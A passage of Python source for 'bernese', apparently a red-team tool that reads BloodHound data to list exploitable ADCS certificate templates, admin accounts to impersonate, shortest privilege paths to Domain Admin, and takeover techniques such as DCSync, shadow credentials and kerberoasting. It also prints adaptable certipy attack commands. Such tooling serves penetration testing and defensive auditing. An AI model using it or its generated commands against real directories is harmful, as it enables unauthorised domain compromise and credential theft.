            print(yellow("      web enrollment endpoint(s): " + ", ".join(str(x) for x in ca["http"])
                         + "  (HTTPS - relayable only without EPA; check with certipy find)"))
        for e in sorted(ca.get("esc7", [])):
            print(red(f"      ESC7: {g.nodes[e].name if e in g.nodes else e} has Manage rights on the CA"))
        if not (ca.get("user_san") or ca.get("http") or ca.get("esc7")):
            print(dim("      no CA-level ESC (ESC6/7/8) detected from collected data"))

    # impersonation targets — the admin accounts (and their SIDs) you put in -upn / -sid
    targets = _impersonation_targets(g)
    if targets:
        print(bold("\n  Impersonation targets  ") + dim("(certipy -upn <name> -sid <SID> for ESC1/ESC4)"))
        for name, sid, upn, label in targets[:15]:
            print(f"      {green(upn)}   {yellow(sid)}   {dim('[' + label + ']')}")
        if len(targets) > 15:
            print(dim(f"      … +{len(targets) - 15} more"))

    vuln = [t for t in g.templates if t.get("escs")]
    def _abusers(t):
        ab = t.get("enrollers", set()) if (set(t["escs"]) & set(ENROLL_ESCS + ("ESC13",))) else set()
        ab = ab | t.get("write_abusers", set())
        interesting = sorted({a for a in ab if g.nodes.get(a)
                              and g.nodes[a].kind in ("User", "Computer") and not _is_admin(g, a)},
                             key=lambda s: g.nodes[s].name)
        admins = sorted({g.nodes[a].name for a in ab if g.nodes.get(a)
                         and g.nodes[a].kind in ("User", "Computer") and _is_admin(g, a)})
        return interesting, admins

    actionable = [t for t in vuln if _abusers(t)[0]]
    adminonly = [t for t in vuln if not _abusers(t)[0]]

    print(bold(f"\n  Actionable templates (non-admin can abuse): {len(actionable)}"))
    if not actionable:
        print(dim("    (none - only admins can enroll the misconfigured templates)"))
    for t in sorted(actionable, key=lambda x: x["name"]):
        interesting, admins = _abusers(t)
        p = t["props"]
        cn = _template_cn(t)
        print(f"\n    {bold(cn)}   {' '.join(red(c) for c in t['escs'])}")
        disp = p.get("displayname")
        if disp and str(disp).upper() != cn.upper():
            print(dim(f"      display name : {disp}"))
        pubs = _ca_publishers(g, t)
        if pubs:
            print(dim("      published by : "
                      + ", ".join(f"{_ca_name(ca)} (host {_ca_host(ca)})" for ca in pubs)))
        else:
            print(dim("      published by : CA→template mapping not in collection — "
                      "use `certipy find` on the box to confirm which CA issues it"))
        ekus = _ekus(t)
        print(dim(f"      EKUs         : {', '.join(_eku_label(e) for e in ekus) or '(none / subordinate CA)'}"))
        print(dim(f"      flags        : ESS={_truthy(p.get('enrolleesuppliessubject'))}  "
                  f"ManagerApproval={_truthy(p.get('requiresmanagerapproval'))}  "
                  f"AuthSignatures={p.get('authorizedsignatures')}  "
                  f"NoSecurityExt={_truthy(p.get('nosecurityextension'))}"))
        gain = ("you act as the linked group" if t["escs"] == ["ESC13"] else "domain compromise")
        print(red(f"      enroll as    : NON-admin principals (own one => {gain}):"))
        for a in interesting:
            sid = a
            print(f"            {green(g.nodes[a].name)}   {dim(sid)}")
        if admins:
            print(dim(f"      (also enrollable by admins: {', '.join(admins)})"))
        # ready-to-adapt certipy — use the first non-admin enroller + the primary target
        code = next((c for c in ("ESC1", "ESC4", "ESC15", "ESC3", "ESC2", "ESC9", "ESC13")
                     if c in t["escs"]), t["escs"][0])
        if t.get("esc13_groups"):
            print(red("      ESC13 grants : "
                      + ", ".join(g.nodes[s].name if s in g.nodes else s for s in t["esc13_groups"])))
        ca = pubs[0] if pubs else (g.cas[0] if g.cas else None)
        caname = _ca_name(ca) if ca else "<CA_NAME>"
        cahost = _ca_host(ca) if ca else "<CA_HOST>"
        tdom = _adcs_domain(g, t)
        enroller = _login_name(g, interesting[0], tdom) if interesting else f"<you>@{tdom}"
        # impersonate an admin of the template's own domain
        tgt = next((x for x in targets if _in_domain(x[1], t.get("domain"))), None) \
            or (None, "<ADMIN_SID>", "administrator@" + tdom.lower(), "")
        print(cyan(f"      certipy {code}:"))
        for line in _certipy_lines(code, tdom, caname, cahost, cn, enroller,
                                   tgt[2], tgt[1]):
            print(cyan(f"        {line}"))

    if adminonly:
        print(dim(f"\n  Vulnerable-by-config but admin-enroll only ({len(adminonly)}):"))
        print(dim("    " + ", ".join(f"{t['name'].split('@')[0]}[{'/'.join(t['escs'])}]"
                                     for t in sorted(adminonly, key=lambda x: x["name"]))))

def _print_esc_branches(g, exclude_reachable=None):
    branches = {}
    for code, abuser, tname in g.esc_branches:
        n = g.nodes.get(abuser)
        if not n or _is_admin(g, abuser):
            continue
        if exclude_reachable and abuser in exclude_reachable:
            continue
        branches.setdefault(abuser, (code, tname))
    if not branches:
        return
    print(bold(cyan("\n  ⚑ Standalone ADCS branches to domain compromise")) + "  " + _optref(14))
    print(dim("  (not linked to START by ACLs - reachable via found creds / a session / relay)"))
    for abuser, (code, tname) in sorted(branches.items(), key=lambda kv: g.nodes[kv[0]].name):
        print(f"    {green(g.nodes[abuser].name)}  {yellow(code)} on {bold(tname)}  {dim('=> Domain Admin')}")

def _print_path(g, path):
    for i, (sid, lbl) in enumerate(path):
        n = g.nodes.get(sid)
        hv = g.is_highvalue(sid)
        if i == 0:
            print(f"  {green('[*]')} {g.label(sid)}")
        else:
            print(dim("        |"))
            print(f"      {yellow(lbl)}  {dim('=>')}  {technique(lbl, n.kind if n else '', n.name if n else sid)}")
            marker = red(">>> ") if hv else "    "
            print(f"  {marker}{g.label(sid)}" + (("  " + red('[HIGH-VALUE: ' + hv + ']')) if hv else ""))

def cmd_paths(g, args):
    src = g.resolve(args.src)
    if not src:
        raise SystemExit(red(f"[!] start principal not found: {args.src}"))
    if args.to:
        dst = g.resolve(args.to)
        if not dst:
            raise SystemExit(red(f"[!] target not found: {args.to}"))
        header(f"Path: {g.nodes[src].name}  ->  {g.nodes[dst].name}")
        path = g.bfs_path(src, dst)
        if not path:
            print(red("  No control path found."))
            return
        _print_path(g, path)
        return
    header(f"Attack paths from {g.nodes[src].name} to high-value targets")
    reach = g.reachable(src)
    hv_targets = sorted([s for s in reach if s != src and g.is_highvalue(s)],
                        key=lambda s: (reach[s][0], g.nodes[s].name))
    if not hv_targets:
        print(dim("  No high-value targets reachable by ACL from this principal."))
    shown = set()
    for t in hv_targets:
        if t in shown:
            continue
        path = g.bfs_path(src, t)
        if not path:
            continue
        print(f"\n  {bold('==>')} {red(g.is_highvalue(t))}: {g.nodes[t].name} "
              f"{dim('(' + str(reach[t][0]) + ' hops)')}")
        _print_path(g, path)
        shown.add(t)
    _print_esc_branches(g, exclude_reachable=set(reach))

def cmd_escalate(g, args):
    src = g.resolve(args.src)
    if not src:
        raise SystemExit(red(f"[!] start principal not found: {args.src}"))
    header(f"Everything reachable from {g.nodes[src].name}")
    reach = g.reachable(src)
    buckets = defaultdict(list)
    for s, (d, lbl) in reach.items():
        if s == src:
            continue
        buckets[g.nodes[s].kind if g.nodes.get(s) else "?"].append((d, s))
    for kind in ("Group", "User", "Computer", "Domain", "GPO"):
        items = sorted(buckets.get(kind, []))
        if not items:
            continue
        print(bold(f"\n  {kind}s reachable: {len(items)}"))
        for d, s in items:
            hv = g.is_highvalue(s)
            tag = "  " + red("[HIGH-VALUE: " + hv + "]") if hv else ""
            print(f"    {dim(str(d)+'h')} {g.label(s)}{tag}")

# --------------------------------------------------------------------------- #
# Visual attack tree
# --------------------------------------------------------------------------- #
def _tech_short(right, kind):
    k = (kind or "").lower()
    if right == "ESC13":
        return "ESC13: cert issuance policy -> act as group member"
    if right == "ESC8":
        return "ESC8: coerce DC + NTLM relay to web enrollment -> DCSync"
    if right.startswith("ESC"):
        return f"{right}: cert abuse -> auth as any DA"
    if right == "GPOAbuse":
        return "edit GPO -> code exec (SYSTEM) on this host"
    if right == "MemberOf":
        return ""
    m = {
        "ForceChangePassword": "reset their password",
        "AddKeyCredentialLink": "shadow credentials -> auth as them",
        "WriteDacl": "grant yourself full control",
        "WriteOwner": "take ownership -> full control",
        "Owns": "owner -> full control", "Owner": "owner -> full control",
        "AddMember": "add yourself to the group",
        "AddSelf": "add yourself to the group",
        "AllExtendedRights": "all extended rights (reset pw / read secrets)",
        "AdminTo": "local admin on this host",
        "AllowedToAct": "RBCD -> take over this host",
        "DCSync": "DCSync the domain (dump all hashes)",
        "ReadGMSAPassword": "read the gMSA password",
        "ReadLAPSPassword": "read the LAPS local-admin password",
        "HasSession": "logged on here -> dump their creds (needs admin)",
        "CanRDP": "RDP in (then local privesc)",
        "CanPSRemote": "WinRM in (then local privesc)",
        "ExecuteDCOM": "code exec over DCOM",
        "SQLAdmin": "MSSQL sysadmin -> xp_cmdshell",
        "HasSIDHistory": "SID history -> holds its rights",
        "SpoofSIDHistory": "golden ticket + ExtraSids across the trust",
    }
    if right in ("GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "Owns",
                 "WriteGPLink") and "gpo" in k:
        return "control GPO -> edit policy -> code exec on linked hosts"
    if right == "GenericAll":
        return "add yourself" if "group" in k else "full control"
    if right == "GenericWrite":
        if "user" in k:
            return "shadow creds / targeted kerberoast"
        if "group" in k:
            return "add yourself to the group"
        return "write -> takeover"
    return m.get(right, "")

# ACL takeover rights that should visually jump out in a tree
_DANGER = {"ForceChangePassword", "GenericAll", "GenericWrite", "WriteDacl",
           "WriteOwner", "Owns", "Owner", "AddKeyCredentialLink", "AllExtendedRights",
           "AddMember", "AddSelf", "WriteSPN", "WriteAccountRestrictions",
           "ReadGMSAPassword", "ReadLAPSPassword"}

def _edge_render(lbl):
    """Colour an edge label by danger so ACL abuse stands out from membership."""
    if lbl.startswith("ESC") or lbl in ("DCSync", "AdminTo", "AllowedToAct", "GPOAbuse",
                                         "SpoofSIDHistory", "HasSIDHistory"):
        return bold(red(lbl))
    if lbl == "MemberOf":
        return dim("memberof")
    if lbl in _DANGER:
        return bold(mag(lbl))
    return yellow(lbl)

# --------------------------------------------------------------------------- #
# Node detail / fastest win / export
# --------------------------------------------------------------------------- #
_DETAIL_FIELDS = [
    ("samaccountname", "sam"), ("enabled", "enabled"), ("description", "description"),
    ("title", "title"), ("email", "email"), ("displayname", "display name"),
    ("admincount", "adminCount"), ("pwdlastset", "pwd last set"),
    ("lastlogontimestamp", "last logon"), ("pwdneverexpires", "pwd never expires"),
    ("passwordnotreqd", "password not required"), ("dontreqpreauth", "no pre-auth (AS-REP)"),
    ("unconstraineddelegation", "unconstrained delegation"),
    ("trustedtoauth", "constrained delegation"), ("sidhistory", "SID history"),
    ("operatingsystem", "OS"), ("whencreated", "created"),
]

def _fmt_ts(v):
    """Epoch int -> 'YYYY-MM-DD (raw)' using a timezone-aware UTC conversion."""
    import datetime
    try:
        iv = int(v)
        if iv > 0:
            return (datetime.datetime.fromtimestamp(iv, datetime.timezone.utc)
                    .strftime("%Y-%m-%d") + dim(f"  ({v})"))
    except (ValueError, TypeError, OSError, OverflowError):
        pass
    return v

def _ts_parse(v):
    """(epoch int, 'YYYY-MM-DD') for a BloodHound timestamp prop; (-1, '-') when unset
    (missing, 0 = 'never', or -1). The int is a clean sort key, newest last."""
    try:
        iv = int(v)
        if iv > 0:
            import datetime
            return iv, datetime.datetime.fromtimestamp(iv, datetime.timezone.utc).strftime("%Y-%m-%d")
    except (ValueError, TypeError, OSError, OverflowError):
        pass
    return -1, "-"

def _user_machine_accounts(g, sid):
    """Computer objects this user owns (Owns/Owner/WriteOwner) — i.e. likely MAQ-created."""
    out = []
    for c, n in g.nodes.items():
        if n.kind != "Computer":
            continue
        if any(src == sid and l in ("Owns", "Owner", "WriteOwner")
               for (src, l) in g.rctrl.get(c, [])):
            out.append(c)
    return out

def _fastest_win(g, owned=None):
    """Shortest known route to a high-value target. Prefer owned principals as
    the launch point, else any non-admin user."""
    owned = owned or set()
    cands = list(owned) if owned else [n.sid for n in g.nodes.values()
                                       if n.kind == "User" and not _is_admin(g, n.sid)]
    best = None
    for sid in cands:
        reach = g.reachable(sid)
        hits = [s for s in reach if s != sid and g.is_highvalue(s)]
        if hits:
            b = min(hits, key=lambda s: reach[s][0])
            hops = reach[b][0]
            if best is None or hops < best[2]:
                best = (sid, b, hops)
    if not best:
        return None
    return g.bfs_path(best[0], best[1])

# --------------------------------------------------------------------------- #
# Interactive mode
# --------------------------------------------------------------------------- #
class _A:
    def __init__(self, **kw):
        self.__dict__.update(kw)

# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #
def _warn_no_tui():
    """Printed when bernese is launched without a subcommand but the TUI's dependencies
    are missing. Says what is wrong and exactly how to fix it."""
    py = os.path.basename(sys.executable) or "python3"
    print(red(bold("[!] bernese can't start its interface: 'textual' and 'rich' are not installed.")))
    print()
    print("    bernese is a full-screen terminal app and needs both packages. Install them")
    print("    with ONE of these, then run the same command again:")
    print()
    here = os.path.dirname(os.path.abspath(__file__))
    if os.path.exists(os.path.join(here, "pyproject.toml")):
        print(bold(f"        pipx install {here}") + dim("   # recommended on Kali / Debian"))
    print(bold(f"        {py} -m pip install textual rich") + dim("   # into the Python you ran this with"))
    print(bold("        python3 -m venv .venv && .venv/bin/pip install textual rich"))
    print(dim("                                              # then: .venv/bin/python bernese.py -d <data>"))
    print()
    print(dim("    If pip refuses with 'externally-managed-environment', use the pipx or venv line."))
    print(dim("    The scripted subcommands still work without them:  bernese -d <data> summary"))

def main():
    ap = argparse.ArgumentParser(
        prog="bernese", description="bernese - BloodHound attack-path explorer")
    ap.add_argument("-d", "--data", required=True, action="append", metavar="DATA",
                    help="BloodHound CE .zip, a directory of *.json, or a single .json. "
                         "Repeat -d to merge per-box collections into one graph "
                         "(-d box1.zip -d box2.zip).")
    ap.add_argument("--no-color", action="store_true", help="disable ANSI colour")
    ap.add_argument("--fresh", action="store_true",
                    help="TUI: forget saved owned/start/targets for this domain and start clean")
    ap.add_argument("-V", "--version", action="version", version=f"bernese {__version__}")
    sub = ap.add_subparsers(dest="cmd", required=False)

    for name, h in [("summary", "domain overview"), ("users", "list users"),
                    ("groups", "list groups"), ("computers", "list computers"),
                    ("das", "domain/enterprise admins"), ("kerberoastable", "SPN accounts"),
                    ("asreproastable", "no pre-auth"), ("dcsync", "DCSync-capable"),
                    ("delegation", "delegation"), ("spns", "SPN reach"),
                    ("adcs", "ADCS ESC abuse"), ("dcs", "domain controllers"),
                    ("maq", "MachineAccountQuota & user-owned machines"),
                    ("pwpolicy", "domain password policy"),
                    ("adminto", "local admin (AdminTo)")]:
        sub.add_parser(name, help=h)

    p = sub.add_parser("members", help="recursive group membership"); p.add_argument("principal")
    p = sub.add_parser("rights", help="who holds a given right"); p.add_argument("right")
    p = sub.add_parser("control", help="outbound control of a principal"); p.add_argument("principal")
    p = sub.add_parser("controllers", help="who controls a principal"); p.add_argument("principal")
    p = sub.add_parser("paths", help="attack paths from a principal")
    p.add_argument("--from", dest="src", required=True); p.add_argument("--to", dest="to", default=None)
    p = sub.add_parser("escalate", help="all nodes reachable from a principal")
    p.add_argument("--from", dest="src", required=True)

    args = ap.parse_args()
    if getattr(args, "no_color", False):
        C.enabled = False
    if not args.cmd and not _HAS_TUI:
        _warn_no_tui()
        raise SystemExit(2)
    g = load(args.data)

    if not args.cmd:
        if args.fresh:
            clear_state(g)
        BerneseApp(g, restore=not args.fresh).run()    # the interactive Textual TUI
        return

    dispatch = {
        "summary": cmd_summary, "users": cmd_users, "groups": cmd_groups,
        "computers": cmd_computers, "das": cmd_das,
        "kerberoastable": cmd_kerberoastable, "asreproastable": cmd_asreproastable,
        "dcsync": cmd_dcsync, "delegation": cmd_delegation, "spns": cmd_spns,
        "members": cmd_members, "rights": cmd_rights, "control": cmd_control,
        "controllers": cmd_controllers, "paths": cmd_paths, "escalate": cmd_escalate,
        "adcs": cmd_adcs, "dcs": cmd_dcs, "maq": cmd_maq, "adminto": cmd_adminto,
        "pwpolicy": cmd_pwpolicy,
    }
    dispatch[args.cmd](g, args)
    print()


# =========================================================================== #
# Interactive Textual TUI — the default when you run this file with
# no subcommand. It needs the third-party `textual` + `rich`; everything above
# (the CLI subcommands) runs with ZERO pip installs, so this block is guarded:
# if those packages are missing the subcommands still work, and running with no
# subcommand prints how to install them.
# =========================================================================== #
import time
bh = sys.modules[__name__]            # self-alias so the TUI code's bh.X resolves here

try:
    from rich.text import Text
    from textual.app import App, ComposeResult
    from textual.binding import Binding
    from textual.containers import Horizontal, Vertical, VerticalScroll
    from rich.cells import cell_len
    from textual.screen import ModalScreen, Screen
    from textual.widgets import (Button, DataTable, Footer, Header, Input, OptionList,
                                 SelectionList, Static, Tree)
    from textual.widgets.option_list import Option
    from textual.widgets.selection_list import Selection
    _HAS_TUI = True
except ImportError:                   # textual/rich absent -> stub the names so the class
    _HAS_TUI = False                  # definitions below still import (the TUI won't run;
    class _StubMeta(type):            # main() checks _HAS_TUI and prints install steps).
        def __getattr__(cls, name):
            return cls
    class _Stub(metaclass=_StubMeta):
        def __init__(self, *a, **k):
            pass
        def __getattr__(self, name):
            return None
    ComposeResult = object
    App = Screen = ModalScreen = Vertical = Horizontal = VerticalScroll = _Stub
    Text = DataTable = Footer = Header = Input = OptionList = Static = Tree = Option = _Stub
    Button = SelectionList = Selection = _Stub
    Binding = _Stub


KIND_COLOR = {"User": "green", "Group": "yellow", "Computer": "cyan",
              "Domain": "magenta", "GPO": "blue", "OU": "grey62",
              "Container": "grey62", "CertTemplate": "blue"}

INLINE_CAP = 12                       # rows shown when a fan-out / category is dropped down
OWNED = "\U0001f480"                   # 💀 — owned marker, like BloodHound's skull
TABLE_CAP = 10000                         # rows drawn in a searchable list (search narrows)
OWNED_TAG = f"{OWNED} owned"           # icon + word — shown on every owned principal
STAR = "◆"                        # ◆ — high-value (one diamond glyph for all high-priv)
CHECK = "✓"                       # ✓ — right you already hold
PRIV_MARK = "◆"                   # ◆ — privileged (effectively-admin) principal
KERB = "⚑kerb"                    # ⚑ — kerberoastable user (SPN set)
KERB_MARK = "\U0001f39f"               # 🎟 — kerberoastable user (SPN set): crack = creds
KERB_STYLE = "purple"                 # plain (non-privileged) kerberoastable users — purple
PRIV_STYLE = "bold orange1"           # privileged USERS — orange, never green-like-a-user
PRIV_COMP_STYLE = "bold magenta"      # privileged / high-value COMPUTERS — distinct from users
OWNED_STYLE = "bold green"            # the owned icon + word
REACH_MARK = "\U0001f517"              # 🔗 — your owned set has a path to it
PIN = "\U0001f4cc"                     # 📌 — a path pinned to the attack tree
TARGET = "\U0001f3af"                  # 🎯 — a node you are going after (^t)
TARGET_STYLE = "bold yellow"
TARGET_KINDS = ("User", "Computer", "Group", "GPO", "OU", "Domain", "Container",
                "CertTemplate", "EnterpriseCA")


def is_kerberoastable(g, sid):
    """A user account with an SPN (not krbtgt) — crackable by Kerberoasting."""
    n = g.nodes.get(sid)
    return bool(n and n.kind == "User"
                and (n.p("hasspn") or n.p("serviceprincipalnames"))
                and sid.rsplit("-", 1)[-1] != "502")


def is_roast_admin(g, sid, priv):
    """A kerberoastable account that is itself privileged — crack it = instant admin."""
    return bool(priv is not None and is_kerberoastable(g, sid)
                and (sid in priv or g.is_highvalue(sid)))


def name_style_for(g, sid, priv):
    """Name colour: privileged computer = magenta, privileged user = orange (a
    kerberoastable ADMIN stays orange), a plain kerberoastable user = purple (stands out
    from regular green users), else by kind (users green, computers cyan)."""
    n = g.nodes.get(sid)
    kind = n.kind if n else "?"
    if priv is not None and sid in priv:
        if kind == "Computer":
            return PRIV_COMP_STYLE
        if kind == "User":
            return PRIV_STYLE
    if kind == "User" and is_kerberoastable(g, sid):
        return KERB_STYLE                      # roastable but not privileged → purple
    return KIND_COLOR.get(kind, "white")

# emoji-presentation glyphs bernese.py emits in ANSI — swapped for plain markers.
_DEMOJI = {"⚠": "!", "⚑": ">", "\U0001f43e": ""}      # ⚠ ⚑ 🐾


# --------------------------------------------------------------------------- #
# small rendering helpers (rich, no ANSI)
# --------------------------------------------------------------------------- #
def short(g, sid):
    n = g.nodes.get(sid)
    if n:
        return n.name.split("@")[0]
    return bh._sid_hint(sid) or str(sid)


def spn_services(n):
    """Distinct SPN service classes on a principal, e.g. ['HTTP', 'CIFS', 'MSSQLSvc']."""
    spns = n.p("serviceprincipalnames") or []
    if isinstance(spns, str):
        spns = [spns]
    out = []
    for s in spns:
        cls = str(s).split("/")[0].strip().rstrip(":")      # "HTTP/host" / "http://host" -> HTTP
        if cls and cls not in out:
            out.append(cls)
    return out


# exportable fields: (id, label). The export screen lets you tick any combination; the
# chosen fields are written tab-separated in THIS order (the order they appear here).
EXPORT_FIELDS = [
    ("name", "Name"),
    ("sam", "sAMAccountName"),
    ("kind", "Kind"),
    ("enabled", "Enabled / disabled"),
    ("os", "Operating system"),
    ("spn", "SPN(s)"),
    ("pwset", "Password last set"),
    ("logon", "Last logon"),
    ("groups", "Groups (all)"),
    ("ctrl", "Control count"),
    ("desc", "Description"),
    ("tags", "Tags (SPN / AS-REP / DC / disabled …)"),
    ("sid", "SID"),
]
EXPORT_DEFAULT = ["name", "pwset", "logon", "tags"]      # pre-ticked when the screen opens
# back-compat aliases so export_line(..., "name") etc. still work (and the smoke test)
_EXPORT_PRESETS = {
    "name": ["name"], "name_os": ["name", "os"], "name_desc": ["name", "desc"],
    "name_tags": ["name", "tags"],
    "full": ["name", "kind", "groups", "ctrl", "desc", "tags"],
}


def _export_field(g, s, fid):
    """The string value of one exportable field for a principal."""
    n = g.nodes.get(s)
    if fid == "name":
        return short(g, s)
    if fid == "sam":
        return (n.p("samaccountname") if n else "") or ""
    if fid == "kind":
        return n.kind if n else "?"
    if fid == "enabled":
        v = n.p("enabled") if n else None
        return "" if v is None else ("enabled" if bh._truthy(v) else "disabled")
    if fid == "os":
        return (n.p("operatingsystem") if n else "") or ""
    if fid == "spn":
        return ", ".join(spn_services(n)) if n else ""
    if fid == "pwset":
        return _ts_parse(n.p("pwdlastset") if n else None)[1]
    if fid == "logon":
        return _ts_parse(n.p("lastlogontimestamp") if n else None)[1]
    if fid == "groups":
        return ", ".join(bh._group_names(g, s, limit=99))
    if fid == "ctrl":
        return str(sum(1 for (_d, l) in g.ctrl.get(s, []) if l != "MemberOf"))
    if fid == "desc":
        return ((n.p("description") if n else "") or "").replace("\n", " ")
    if fid == "tags":
        return node_tags(g, s).plain.strip()
    if fid == "sid":
        return s
    return ""


def export_line(g, s, fields):
    """One tab-separated output line for a principal. `fields` is a list of field ids
    (see EXPORT_FIELDS); a preset name string is also accepted for back-compat."""
    if isinstance(fields, str):
        fields = _EXPORT_PRESETS.get(fields, ["name"])
    return "\t".join(_export_field(g, s, f) for f in fields)


def ntext(g, sid, star=True, priv=None, kind=True):
    """A node name as rich Text, coloured by kind.  ★ when high-value, a red 'priv'
    tag when the principal is privileged (effectively admin). `kind=False` drops the
    "(User)" suffix for contexts that already show a KIND column."""
    n = g.nodes.get(sid)
    nkind = n.kind if n else "?"
    name_style = name_style_for(g, sid, priv) if priv is not None else KIND_COLOR.get(nkind, "white")
    t = Text(short(g, sid), style=name_style)
    if kind:
        t.append(f"  ({nkind})", style="grey50")
    if star and g.is_highvalue(sid):
        t.append(f"  {STAR}", style="bold red")
    elif priv is not None and sid in priv:
        t.append(f"  {PRIV_MARK}", style=name_style)
    # kerberoastable users also get a 🎟 ticket marker (on top of the purple name) — so a
    # roastable DA reads "name ◆ 🎟": high-value AND crackable to creds.
    if is_kerberoastable(g, sid):
        t.append(f" {KERB_MARK}", style="yellow")
    return t


def node_tags(g, sid):
    n = g.nodes.get(sid)
    if not n:
        return Text("")
    t = Text()
    if bh._is_admin(g, sid):
        t.append("ADMIN ", style="bold red")
    if n.kind == "User" and (n.p("hasspn") or n.p("serviceprincipalnames")) and sid.rsplit("-", 1)[-1] != "502":
        t.append(f"Kerb/{bh._A_plain(bh._roast_enc_tag(n)[0])} ", style="yellow")
    if n.p("dontreqpreauth"):
        t.append("AS-REP ", style="yellow")
    if n.p("unconstraineddelegation"):
        t.append("UNCONSTR ", style="bold red")
    if n.p("trustedtoauth"):
        t.append("CONSTR ", style="yellow")
    if any(l == "AllowedToAct" for (_s, l) in g.rctrl.get(sid, [])):
        t.append("RBCD ", style="yellow")
    if n.kind == "Computer" and bh._is_dc(g, sid):
        t.append("DC ", style="bold red")
    en = n.p("enabled")
    if en is not None and not bh._truthy(en):
        t.append("DISABLED ", style="grey50")
    return t


def resolve_all(g, token):
    """Quiet name resolver for the TUI — returns the list of matching sids (0, 1 or many)
    without printing, so the caller can show candidates instead of corrupting the screen."""
    if not token:
        return []
    if token in g.nodes:
        return [token]
    t = token.upper()
    if t in g.by_name:
        return [g.by_name[t]]
    if g.domain_name and "@" not in t and "." not in t:
        cand = f"{t}@{g.domain_name.upper()}"
        if cand in g.by_name:
            return [g.by_name[cand]]
    exact = sorted({sid for nm, sid in g.by_name.items() if t == nm.split("@")[0]})
    if len(exact) == 1:
        return exact
    return sorted({sid for nm, sid in g.by_name.items() if t in nm})


def _path_text(g, src, dst, priv):
    """The shortest control path src -> dst as indented rich Text, one hop per line,
    each hop labelled with the technique that takes you there."""
    path = g.bfs_path(src, dst)
    out = Text()
    if not path:
        return out
    for i, (psid, lbl) in enumerate(path):
        hvp = bool(g.is_highvalue(psid))
        nstyle = name_style_for(g, psid, priv)
        nm = short(g, psid) + (f"  {STAR}" if hvp else "")
        if i == 0:
            out.append("    you are here: ", style="grey50")
            out.append(f"{nm}\n", style=nstyle)
        else:
            line = Text(f"     {i}. ", style="grey50")
            estyle = ("grey50" if lbl == "MemberOf" else
                      "bold magenta" if lbl in bh._DANGER else "yellow")
            line.append(f"{lbl} -> ", style=estyle)
            line.append(nm, style=nstyle)
            line.append("\n")
            out.append(line)
    return out


# why a well-known high-value principal matters — keyed by RID (and builtin S-1-5-32 RID)
WHY_HIGHVALUE = {
    "512": "Domain Admins: full admin over the domain and every machine joined to it.",
    "519": "Enterprise Admins: full admin across the entire AD forest.",
    "518": "Schema Admins: can change the AD schema — forest-wide and permanent.",
    "516": "Domain Controllers: hosts the directory; SYSTEM on a DC = domain compromise.",
    "521": "Read-only Domain Controllers: hold a filtered replica of directory secrets.",
    "526": "Key Admins: can write msDS-KeyCredentialLink — shadow-credential any account.",
    "527": "Enterprise Key Admins: key-credential rights across the forest.",
    "502": "krbtgt: its hash signs every Kerberos ticket (Golden Ticket = forge any identity).",
    "544": "Administrators (builtin): local admin on the DCs = domain compromise.",
    "548": "Account Operators: can modify most non-protected users and groups.",
    "549": "Server Operators: can log on to and control domain controllers.",
    "550": "Print Operators: can load drivers on DCs and log on locally.",
    "551": "Backup Operators: SeBackup/Restore on DCs — can read the NTDS.dit database.",
}


def why_highvalue(sid):
    """Short reason a well-known high-value principal is powerful, or '' if not one."""
    s = str(sid)
    if "S-1-5-32-" in s:
        b = s.split("S-1-5-32-")[-1]
        if b in WHY_HIGHVALUE:
            return WHY_HIGHVALUE[b]
    return WHY_HIGHVALUE.get(s.rsplit("-", 1)[-1], "")


def build_summary_compact(g, sid, priv):
    """A SHORT node detail for the small left-column pane: identity + key properties +
    a group count + the high privileges it holds. Full detail is one keypress away (i)."""
    n = g.nodes.get(sid)
    if not n:
        return Text(f"{sid}\n(unresolved — {bh._sid_hint(sid) or 'not in collection'})\npress i for node info",
                    style="grey62")
    out = Text()
    out.append(short(g, sid) + "  ", style=f"bold {name_style_for(g, sid, priv)}")
    out.append(f"({n.kind})\n", style="grey50")
    out.append(f"{sid}\n", style="grey50")                    # SID — certipy -sid, impacket, etc.
    hv = g.is_highvalue(sid)
    if hv:
        out.append(f"{STAR} {hv}\n", style="bold red")
    elif sid in priv:
        out.append(f"{PRIV_MARK} privileged (effectively admin)\n", style=PRIV_STYLE)
    desc = n.p("description")
    if desc:
        out.append(f"{str(desc).replace(chr(10), ' ')[:70]}\n", style="italic grey70")

    # kerberoastable → show the SPN service classes (what to roast)
    if is_kerberoastable(g, sid):
        svcs = spn_services(n)
        out.append("  kerberoastable", style="purple")
        out.append(f"  SPN: {', '.join(svcs[:4]) if svcs else '?'}\n", style="grey70")

    # key properties (compact, capped)
    if n.kind in ("User", "Computer"):
        shown = 0
        for key, lab in bh._DETAIL_FIELDS:
            if key == "description":
                continue
            v = n.p(key)
            if v in (None, "", [], False) and not (key == "enabled" and v is False):
                continue
            if isinstance(v, list):
                v = ", ".join(str(x) for x in v)
            elif key in ("pwdlastset", "lastlogontimestamp", "whencreated"):
                v = bh._fmt_ts(v)
            out.append(f"  {lab}: ", style="grey62")
            out.append(f"{v}\n", style="white")
            shown += 1
            if shown >= 4:
                break

    # group count
    if n.kind in ("User", "Computer"):
        ngroups = sum(1 for s in bh._principal_closure(g, sid)
                      if s != sid and g.nodes.get(s) and g.nodes[s].kind == "Group")
        out.append(f"  member of {ngroups} group(s)\n", style="grey70")
    elif n.kind == "Group":
        nmem = sum(1 for m in bh._expand_members(g, sid)
                   if g.nodes.get(m) and g.nodes[m].kind in ("User", "Computer"))
        out.append(f"  {nmem} member(s)\n", style="grey70")

    # high privileges it holds (direct or via groups), top few
    eff = {}
    for p in bh._principal_closure(g, sid):
        for (d, l) in g.ctrl.get(p, []):
            if l != "MemberOf":
                eff.setdefault(l, set()).add(d)
    if eff:
        out.append("high privileges:\n", style="bold")
        for r, tgts in sorted(eff.items(), key=lambda x: -len(x[1]))[:4]:
            rstyle = "bold magenta" if r in bh._DANGER else "yellow"
            out.append(f"  {r}", style=rstyle)
            out.append(f" × {len(tgts)}\n", style="grey70")
        if len(eff) > 4:
            out.append(f"  +{len(eff) - 4} more\n", style="grey50")
    out.append("\npress i for full node info", style="grey50")
    return out


def build_summary(g, sid, priv):
    """Multi-line rich Text describing a node — shown in the detail pane."""
    n = g.nodes.get(sid)
    if not n:
        return Text(f"{sid}\n(unresolved — {bh._sid_hint(sid) or 'not in collection'})", style="grey62")
    out = Text()
    out.append(short(g, sid) + "\n", style=f"bold {name_style_for(g, sid, priv)}")
    out.append(f"{n.kind}", style="grey62")
    hv = g.is_highvalue(sid)
    if hv:
        out.append(f"   {STAR} {hv}", style="bold red")
